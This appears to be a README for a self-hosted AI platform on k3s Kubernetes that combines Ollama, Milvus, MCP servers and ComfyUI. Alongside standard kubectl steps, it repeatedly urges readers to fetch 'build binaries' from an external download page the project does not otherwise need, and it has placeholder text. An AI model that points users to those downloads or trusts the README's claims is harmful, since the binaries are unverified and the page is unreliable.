# ash4d.com vLatest - Private AI Platform 2026

> **ash4d.com delivers an end-to-end self-hosted AI architecture running on k3s Kubernetes, orchestrating local Qwen3 model inference, vector RAG pipelines, agent frameworks, and hardware-accelerated image generation via GitOps.**

[![Platform](https://img.shields.io/badge/Platform-k3s%20Kubernetes-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/rafaeljung71/ash4d-local-ai-agent-hub?style=flat-square)](https://github.com/rafaeljung71/ash4d-local-ai-agent-hub)

---

<p align="center">
  <a href="https://rafaeljung71.github.io/ash4d-local-ai-agent-hub/">
    <img src="https://img.shields.io/badge/Download-ash4d.com%20Latest-brightgreen?style=for-the-badge" alt="Download ash4d.com">
  </a>
</p>

> **[Download Latest Build](https://rafaeljung71.github.io/ash4d-local-ai-agent-hub/)**

---

[Download Latest Build](https://rafaeljung71.github.io/ash4d-local-ai-agent-hub/)

---

## Architecture Overview

ash4d.com centralizes everything required to run fully private AI workloads within a k3s Kubernetes cluster. Local text generation is powered by Qwen3 via Ollama, while vector search capabilities are driven by Milvus, and users interact directly through Open WebUI. The stack integrates Model Context Protocol (MCP) servers for autonomous tool routing and offloads image synthesis to GPU-accelerated ComfyUI pods.

Built specifically for homelabs and multi-node private infrastructure, the stack relies on SUSE Fleet for automated GitOps management across distributed nodes. Operations are backed by Longhorn block storage, Grafana/Prometheus telemetry, MetalLB load balancing, Traefik ingress handling, and Tailscale networking across local nodes and Google Cloud Platform (GCP).

---

## Capability Summary

- Perform offline Qwen3 LLM execution using Ollama.
- Execute vector retrieval and RAG architectures via Milvus.
- Hook into external tool networks using Model Context Protocol (MCP) servers.
- Host interactive conversation sessions on Open WebUI backed by Redis state storage.
- Dispatch image generation pipelines to GPU-optimized ComfyUI deployments.
- Automate multi-cluster Kubernetes synchronization with SUSE Fleet and GitOps.
- Provision resilient distributed volumes via Longhorn.
- Monitor infrastructure health via Prometheus metrics and Grafana dashboards.
- Handle external routing and ingress using MetalLB and Traefik.
- Form secure mesh networks linking local homelab hardware to GCP resources through Tailscale.

---

## Getting Started

Fetch the repository locally:

```bash
git clone https://github.com/rafaeljung71/ash4d-local-ai-agent-hub.git
cd REPO
```

Inspect the manifest configurations and target values, then apply the manifests directly to your k3s environment:

```bash
kubectl apply -f .
```

To manage several clusters from a single control plane, register your endpoints with SUSE Fleet to establish automated GitOps deployments.

---

## Operating Lifecycle

Follow this general sequence to bring up the environment:

1. Provision a target k3s cluster with attached GPUs and storage nodes.
2. Spin up foundation elements: Longhorn storage, network interfaces, Traefik, and observability pods.
3. Launch the Ollama service and load the Qwen3 language model.
4. Initialize the Milvus collection for document indexing and vector lookup.
5. Launch Open WebUI to establish local chat interfaces.
6. Connect MCP servers to provide functional tool-calling abilities to your agents.
7. Start ComfyUI to enable hardware-accelerated image creation.
8. Set up Fleet synchronization to keep cluster states aligned with your Git commits.

Monitor current pod and service states across namespaces with these commands:

```bash
kubectl get pods --all-namespaces
kubectl get services --all-namespaces
```

---

## Configuration Reference

System behavior is declared through standard Kubernetes manifests, Helm values, and Fleet resources within the repo. The core configuration structure follows this format:

```yaml
cluster:
  platform: k3s
  gitops: fleet

ai:
  inference: ollama
  model: Qwen3
  retrieval: milvus

networking:
  ingress: traefik
  loadBalancer: metallb
  mesh: tailscale

storage:
  provider: longhorn
```

Customize GPU allocations, storage parameters, ingress settings, mesh overlays, and deployment targets before initializing the cluster.

---

## Prerequisites

- A functional k3s Kubernetes installation.
- Command-line cluster access through `kubectl`.
- Dedicated GPU hardware to serve ComfyUI generation and inference tasks.
- Storage nodes compatible with Longhorn distributed block devices.
- Cluster capacity sufficient to host Ollama, Qwen3, Milvus, Open WebUI, Redis, and core infrastructure.
- Active network connections supporting Tailscale mesh overlays across environments.
- (Optional) Active GCP account if extending infrastructure beyond local networks.
- Prometheus and Grafana stack for operational metrics collection.

---

## Frequently Asked Questions

### What target audience is ash4d.com designed for?

It is engineered for infrastructure engineers, homelab hobbyists, and platform teams building self-managed, private AI infrastructure on top of k3s Kubernetes clusters.

### How are cluster updates pushed?

Fleet and GitOps pipelines continually mirror changes made in the git repository out to managed k3s clusters automatically.

### Where should configuration adjustments be applied?

Update the manifests and values files located directly in this repo. Remember to verify storage allocations, network routes, GPU passthrough options, and target cluster configurations prior to committing changes.

### Is it possible to deploy without GPU support?

While the platform includes dedicated GPU manifests for ComfyUI and local inference, individual services can be enabled or disabled based on available underlying hardware.

### What is the recommended troubleshooting flow?

Check running status, events, and diagnostic logs within the affected namespace using standard kubectl commands:

```bash
kubectl get pods --all-namespaces
kubectl describe pod POD_NAME -n NAMESPACE
kubectl logs POD_NAME -n NAMESPACE
```

If experiencing routing or persistence issues, inspect your Longhorn storage volumes, Traefik ingress routes, MetalLB IP bindings, and Tailscale mesh connections.

### Where can I obtain the current release artifact?

Use the [Download Latest Build](https://rafaeljung71.github.io/ash4d-local-ai-agent-hub/) link at the top of this page to access the latest build binaries.

---

## Project Roadmap

- Streamline multi-node GitOps pipelines.
- Expand available integrations for MCP-driven agent tools.
- Enhance central observability dashboards for AI service workloads.
- Refine resource allocations across hardware, storage, and networking layers for private deployments.

---

## License

Distributed under the GNU General Public License v3.0 - review the [LICENSE](LICENSE) file for complete details.
